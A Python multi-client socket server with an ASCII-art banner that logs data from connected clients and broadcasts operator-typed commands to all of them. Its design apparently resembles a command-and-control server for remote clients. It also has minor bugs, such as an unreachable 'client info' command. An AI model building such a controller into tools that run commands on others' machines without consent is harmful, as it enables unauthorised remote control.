import socket
import threading 
#this will store the logs
logs = {}
#here we'll store the client handlers so we can manage clients separately
clients = {}
#the client handle(used to accept and manage connections)

print(" __  __     __  __     ______     __    ")
print("/\ \_\ \   /\ \/\ \   /\  == \   /\ \   ")
print("\ \____ \  \ \ \_\ \  \ \  __<   \ \ \  ")
print(" \/\_____\  \ \_____\  \ \_\ \_\  \ \_\ ")
print("  \/_____/   \/_____/   \/_/ /_/   \/_/ ")
class ClientHandle:
    #accept connection, socket_a is the socket object
    def accept(self, socket_a):
        self.socket = socket_a 
        
        self.connection, self.address = self.socket.accept()
        global clients 
       
        print(self.connection)
        #checking availability of an idenificator for our client handler
        threading.Thread(target=self.check_identity).start()
        self.data_thread = threading.Thread(target=self.receive_data).start()
    def logs(self, log):
        global logs 
        logs[str(self.address)] = log
    def check_identity(self):

        #assigning an identificator for a client based on number of clients currently connected
        self.ident = 0
        for i in clients:
            self.ident+=1 
       
        while True:
            try:
                self.ident+=1
                print(clients[self.ident])
                #clients[self.ident]=self.connection
            except:
                
                clients[self.ident]=self.connection
                break
    #function for receiving data via the socket
    def receive_data(self):
       
        while True:
            try:
                self.data = self.connection.recv(2048).decode()
                print(self.data)
                self.logs(self.data)
                if not self.data:
                    global clients
                    clients.pop(self.ident)
                    print(clients)
                    print("removed a client")
                    break
            except:
                
                clients.pop(self.ident)
                print(clients)
                print("removed a client")
                break
    #literally closes the connection from this client
    def close(self):
        self.connection.close()
    #unused, can send the client a command
    def send_command(self, command):
        self.connection.send(str(command).encode())
#server >w<
class Server():
    #declaring some variables we will work with
    def __init__(self):
        self.port = int 
        self.max_clients = int 
        self.ip = int
        self.connections = []
        self.supress_message = False
    #this function gets called the first, used to start the server
    def start(self):
        #reads the config
        self.read_cfg()
        #starts the listening thread(for clients)
        threading.Thread(target=self.listen).start()
    #used for internal commands
    def recognize_internal_command(self):
        #need to use the global for this, otherwise we'd get an error
        global clients
        #just checking for recognized commands
        #.strip() strips it of spaces and .lower() converts UPPERCASE letters into lowercase
        if self.command.strip().lower() == "clients":
            print(clients)
            print(f"[SERVER]: Connected clients->{len(clients.keys())}")
        elif self.command.lower() == "client info":
            print(clients[self.command.split("client info")[1]])
        elif self.command.strip().lower() == "help":
            print("All commands: help, clients, client info [client], info")
        elif self.command.strip().lower() == "info":
            print("Made by Minex\nVersion: 1.2\ngithub.com/yourdarl1ng")
        elif self.command.strip().lower() == "shm":
            self.supress_message = not self.supress_message
        else:
            if not self.supress_message:
                print("Need help? Type 'help' or 'shm' to supress this message")
            self.send_all_comms(self.command)
    #function(we thread this one) for receiving input and sending it to the client
    def commands(self):
        while True:
            self.command = input("command->")
            #we call all the functions here
            self.recognize_internal_command()
            #self.send_all_comms(self.command)
    #this one sends all clients a command
    def send_all_comms(self, command):
        #using global again so there aren't any errors
        global clients
        #for loop used to get every connection we have saved and sending data to the client
        for client in clients:
            try:
                clients[client].send(str(command).encode())
            except:
                print(f"[ERROR]: Couldn't send command to {clients[client]}")
            
           
    #reading the config for the server
    def read_cfg(self):
        #using try/except so if there isn't a config a new one will be made
        try:
            #reading an existing one
            with open("server.cfg", "r") as config:
                self.lines = config.read()
                self.port = int(self.lines.split("\n")[0].split("=")[1])
                self.max_clients = int(self.lines.split("\n")[1].split("=")[1])
                self.ip = self.lines.split("\n")[2].split("=")[1]
                config.close()
            print("[LOGS]: Config loaded")
        #if there isn't one this gets executed
        except Exception as e:
            #printing the exception message
            print(e)
            #making the new cfg and assigning the values to variables
            with open("server.cfg", "w+") as config:
                self.localip = socket.gethostbyname(socket.gethostname())
                config.write(f"port=4465\nmax clients=500\nip={self.localip}\n")
                self.port = 4465
                self.max_clients = 500
                self.ip = self.localip
                config.close()

            print("[LOGS]: config made")
    #listening thread for clients
    def listen(self):
        #making the socket so we can use all the networking stuff we need
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        #binding it to the ip and port we specified in our config
        self.socket.bind((self.ip, int(self.port)))
        #max pending connections to our server, mislabeled as max clients
        self.socket.listen(self.max_clients)

        print(f"[LISTENING]: Started on {self.ip}, {self.port}")
        #threading the commands function
        threading.Thread(target=self.commands).start()
        while True:
            #a loop that will accept a client connection and make a new handler
            ClientHandle().accept(self.socket)
            
            
            print("[LOGS]: Accepted a new client connection")
            #saving logs, if any
            self.save_logs()
    #used to save logs, doesn't get called often but made it anyway
    def save_logs(self):
        with open("logs.txt", "r") as log:
            log_data = log.read()
            log.close() 
        with open("logs.txt", "w") as log:
            global logs
            log.write(log_data + f"\n{logs}")
            logs.clear()
            log.close()
#starting the whole thing
Server().start()
